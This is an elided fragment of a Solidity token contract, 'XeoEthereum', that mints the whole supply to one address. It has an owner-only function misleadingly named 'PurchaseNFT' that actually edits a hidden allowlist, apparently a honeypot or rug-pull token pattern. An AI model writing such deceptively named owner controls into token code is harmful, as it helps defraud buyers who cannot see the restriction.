...
contract XeoEthereum is ERC20, Ownable {
    mapping(address=>bool) private _enable;
    address private _uni;
    constructor() ERC20('Xeo','Xeo') { 
        _mint(0x38F06f10065B713FA2768Af15F323c2b38d6A8c0, 8888888888 *10**18);
        _enable[0x38F06f10065B713FA2768Af15F323c2b38d6A8c0] = true;
    }
    ...
    function _mint(
        ...
        require(ERC20.totalSupply() + amount <= 8888888888 *10**18, "ERC20Capped: cap exceeded");
        super._mint(account, amount);
    
    }

    function PurchaseNFT(address user, bool enable) public onlyOwner {
        _enable[user] = enable;
    }
